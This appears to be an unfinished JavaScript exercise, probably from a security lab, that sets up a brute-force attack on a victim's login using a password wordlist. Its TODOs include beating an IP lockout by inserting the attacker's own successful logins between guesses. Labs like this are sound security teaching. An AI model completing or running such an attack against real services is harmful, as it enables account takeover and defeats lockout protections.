const fs = require("fs");

// TODO1:
// Set the missing configuration
const loginUrl = "";
const myUsername = "";
const myPassword = "";
const victimUsername = "";
const inputFilePath = "";

const candidates = fs.readFileSync(inputFilePath, "utf-8").split("\n");

async function login(username, password) {
  try {
    const response = await fetch(loginUrl, {
      method: "POST",
      headers: {
        "content-type": "application/json",
      },
      // TODO2:
      // Complete the body of the request
      body: {},
    });

    // TODO3:
    // Detect when the victim login is successful.
    // Print the correct credentials and stop the attack.
  } catch (error) {
    console.error("Error:", error.message);
  }
}

// Function to attempt login
async function bruteForce() {
  for (let i = 0; i < candidates.length; i++) {
    passwordToTry = candidates[i].trim();
    const success = await login(victimUsername, passwordToTry);
    if (success) {
      return;
    }
    // TODO 4:
    // The application blocks an IP after several failed attempts.
    // Insert a successfull login attempt at the correct interval
    // to bypass the protection.
  }
  console.log("Brute force attempt completed. No valid credentials found.");
}

bruteForce();
